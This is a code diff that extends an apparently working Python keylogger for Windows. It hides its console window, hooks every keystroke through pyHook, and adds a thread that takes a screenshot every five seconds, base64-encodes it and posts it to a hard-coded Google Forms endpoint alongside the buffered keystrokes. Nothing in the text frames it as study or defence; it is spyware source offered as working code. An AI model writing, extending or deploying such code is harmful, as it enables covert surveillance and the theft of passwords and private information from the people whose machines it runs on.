@@ -2,6 +2,7 @@
 import Queue
 import io
 import threading
+import time
 
 from PIL import Image
 
@@ -25,6 +26,9 @@ if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
 
 data = ''
 key_strokes_queue = Queue.Queue()
+screenshot_queue = Queue.Queue()
+
+BUFFER_SIZE = 1000
 
 # Hide Console
 def hide():
@@ -64,9 +68,10 @@ def remote_send():
 
 
 # Remote Google Form logs post
-def remote():
+# Buffer size ~1000 char
+def send_key_logs():
     global data
-    if len(data) > 1000:
+    if len(data) > BUFFER_SIZE:
         print data
         key_strokes_queue.put(data)
         data = ''
@@ -76,25 +81,12 @@ def remote():
     return True
 
 
-# data:image/png;base64,
-def take_screenshot():
-    buffer = io.BytesIO()
-
-    img = ImageGrab.grab()
-    print img.size
-    img.thumbnail(tuple([.1 * x for x in img.size]), Image.ANTIALIAS)
-    img.save("screenshot_1.jpg", "JPEG")
-    img.save(buffer, "JPEG")
-    img.close()
-
-    print "Image saved"
-
-    imgStr = base64.b64encode(buffer.getvalue())
-    print imgStr
-    print len(imgStr)
+def remote_send_screenshot():
+    screenshot_to_be_sent = screenshot_queue.get()
+    print len(screenshot_to_be_sent), screenshot_to_be_sent
 
     url = "https://docs.google.com/forms/d/1uau6h2gX7crd8q3j2dSFWFWfC5YxB_-ojnX3I0l466I/formResponse"
-    form_data = {'entry.1256060651': imgStr[:5000]}
+    form_data = {'entry.1529555865': screenshot_to_be_sent[:5000]}
     user_agent = {
         'Referer': 'https://docs.google.com/forms/d/1uau6h2gX7crd8q3j2dSFWFWfC5YxB_-ojnX3I0l466I/viewform',
         'User-Agent': "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.52 Safari/537.36"}
@@ -108,65 +100,55 @@ def take_screenshot():
     # plt.show()
 
 
+# data:image/png;base64,
+def take_screenshot(img_width=500):
+    while True:
+        buffer = io.BytesIO()
+
+        img = ImageGrab.grab()
+        img.thumbnail((img_width, img.size[1] * img_width / img.size[0]), Image.ANTIALIAS)
+        img.save(buffer, "JPEG")
+        img.close()
+        img_base64 = base64.b64encode(buffer.getvalue())
+
+        screenshot_queue.put(img_base64)
+
+        t = threading.Thread(target=remote_send_screenshot)
+        t.daemon = True
+        t.start()
+
+        time.sleep(5)
+
+
 def OnKeyboardEvent(event):
     if (event.Ascii > 31 and event.Ascii < 127) or event.Ascii == 13 or event.Ascii == 9:
         data = (event.WindowName, event.Window, event.Time, event.Ascii, event.Key, event.Alt)
-        print data # debugging
+        print data  # debugging
+
 
 def keypressed(event):
     global data
-    # print dir(event)
-    # print event.KeyID
-    # if event.isAlt:
-    #     data += "[Mayten Om Alt]"
-    # else:
-    print "Down:", event.Key
-    # print event.GetMessageName
-    # print event.GetKey
-    # if event.Ascii == 13:
-    #     keys = '<ENTER>'
-    # elif event.Ascii == 8:
-    #     keys = '<BACK SPACE>'
-    # elif event.Ascii == 9:
-    #     keys = '<TAB>'
-    # else:
-    #     try:
-    #         keys = chr(event.Ascii)
-    #     except:
-    #         return
     data += "[%s]" % event.Key
-    remote()
+    send_key_logs()
 
 
-# def keyreleased(event):
-#     global data
-#
-#     print "UP:", event.Key
-#     data += "[^%s]" % event.Key
-#     remote()
+def run_keylogger_handler():
+    hookManager= pyHook.HookManager()
+    hookManager.KeyDown = keypressed
+    hookManager.HookKeyboard()
+    pythoncom.PumpMessages()
+
+
+def run_screenshot_handler():
+    t = threading.Thread(target=take_screenshot, args=[1000])
+    t.daemon = True
+    t.start()
+
 
 def main():
     hide()
-    # take_screenshot()
-
-    obj = pyHook.HookManager()
-    obj.KeyDown = keypressed
-    # obj.KeyDown = OnKeyboardEvent
-    # obj.KeyUp = keyreleased
-    # print dir(obj)
-    obj.HookKeyboard()
-    pythoncom.PumpMessages()
-
-    # while True:
-    #     try:
-    #         while True:
-    #             pythoncom.PumpWaitingMessages()
-    #     except:
-    #         pass
-
-    # if len(sys.argv) > 2:
-    #     if sys.argv[2] == "startup":
-    #         addStartup()
+    run_screenshot_handler()
+    run_keylogger_handler()
 
 
 if __name__ == '__main__':
